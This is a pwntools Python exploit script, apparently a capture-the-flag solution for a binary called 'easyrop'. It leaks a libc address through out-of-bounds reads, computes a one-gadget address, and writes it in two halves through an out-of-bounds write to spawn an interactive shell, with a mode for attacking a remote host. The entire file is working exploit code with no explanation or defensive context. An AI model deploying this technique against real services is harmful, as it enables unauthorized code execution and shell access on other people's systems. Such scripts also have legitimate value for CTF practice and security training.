from pwn import *

elf = context.binary = ELF('./easyrop')

gdbscript='''
conitnue
''' 

def conn(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([elf.path] + argv, *a, **kw)

while True:
    io = conn() 

    io.sendline(b"2")
    io.sendline(b"130")
    io.recvuntil(b" is ")
    leak2=io.recvline().strip()

    io.sendline(b"2")
    io.sendline(b"131")
    io.recvuntil(b" is ")
    leak1=io.recvline().strip()

    leak = int(b"0x"+leak1+leak2,16) - 0x2718a  
    print("LEAK",hex(leak),leak1,leak2)

    gadget = leak + 0xebcf8#1104842
    io.sendline(b"1")
    io.sendline(b"130")
    pl=str(gadget&0x00000000ffffffff)
    io.sendline(pl.encode())
    print("part1",hex(int(pl)))
    io.sendline(b"1")
    io.sendline(b"131")
    pl=str(gadget>>32)
    print("part2",hex(int(pl)))
    io.sendline(pl.encode())


    io.sendline(b"3")
    io.interactive() 
